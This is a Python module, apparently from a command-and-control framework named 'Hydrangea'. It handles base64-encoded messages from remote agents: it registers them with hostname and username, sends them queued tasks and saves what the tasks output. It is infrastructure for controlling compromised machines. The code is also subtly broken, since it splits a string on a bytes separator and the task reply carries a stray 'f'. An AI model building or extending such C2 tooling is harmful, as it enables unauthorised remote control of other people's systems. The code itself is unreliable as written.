import base64
from database.database import HydrangeaDatabase

# Function to handle communication with agent; takes input from agent and saves it, returns message for agent
def handleAgentCommunication(db: HydrangeaDatabase, agentMessageB64: str):
    # Decode agent messages
    agentMessagesDecoded = base64.b64decode(agentMessageB64.encode("utf-8")).decode("utf-8").split(b"\x00") # null-separated messages

    # According to agent message type, perform some action; and save any output
    agentReplyArray = []
    for agentMessage in agentMessagesDecoded:
        agentMessageSplit = agentMessage.split("-")

        ## Agent registration; "AGENT_REGISTER-123ABC-HOSTNAME-USERNAME"
        if agentMessageSplit[0] == "AGENT_REGISTER":
            if db.saveAgentInfo(
                agentId=agentMessageSplit[1],
                host=agentMessageSplit[2],
                username=agentMessageSplit[3]
            ):
                agentReplyArray.append(f"REGISTERED-{agentMessageSplit[1]}")
                print(f"SUCCESS: Agent {agentMessageSplit[1]} checked in; saved")
            else:
                print(f"ERROR: Agent {agentMessageSplit[1]} checked in but could not be saved")

        ## Subagent registration; "SUBAGENT_REGISTER-456DEF-HOSTNAME-USERNAME"
        elif agentMessageSplit[0] == "SUBAGENT_REGISTER":
            if db.saveAgentInfo(
                agentId=agentMessageSplit[1],
                host=agentMessageSplit[2],
                username=agentMessageSplit[3]
            ):
                agentReplyArray.append(f"REGISTERED-{agentMessageSplit[1]}")
                print(f"SUCCESS: Agent {agentMessageSplit[1]} checked in; saved")
            else:
                print(f"ERROR: Agent {agentMessageSplit[1]} checked in but could not be saved")

        ## Get tasks for particular agent; "GET_TASKS-123ABC"
        elif agentMessageSplit[0] == "GET_TASKS":
            tasksNew = db.getNewTasksForAgent(
                agentId=agentMessageSplit[1],
                setTasked=True
            )
            for taskNew in tasksNew:
                taskId = taskNew.id
                taskB64Encoded = base64.b64encode(taskNew.task.encode("utf-8")).decode("utf-8")
                agentReplyArray.append(f"TASK-f{agentMessageSplit[1]}-{taskId}-{taskB64Encoded}") # TASK-123ABC-14-base64(input)

        ## Task output; "TASK_OUTPUT-12-base64(output)"
        elif agentMessageSplit[0] == "TASK_OUTPUT":
            taskId = agentMessageSplit[1]
            output = base64.b64decode(agentMessageSplit[2].encode("utf-8")).decode("utf-8")

            if db.setTaskOutput(
                taskId=taskId,
                output=output
            ):
                print(f"SUCCESS: Saved output for Task ID '{taskId}'")
            else:
                print(f"ERROR: Could not save output for Task ID '{taskId}'")


    # Prepare reply to send to Agent
    agentReplyArray = map(lambda x: x.encode("utf-8"), agentReplyArray)
    return b"\x00".join(agentReplyArray)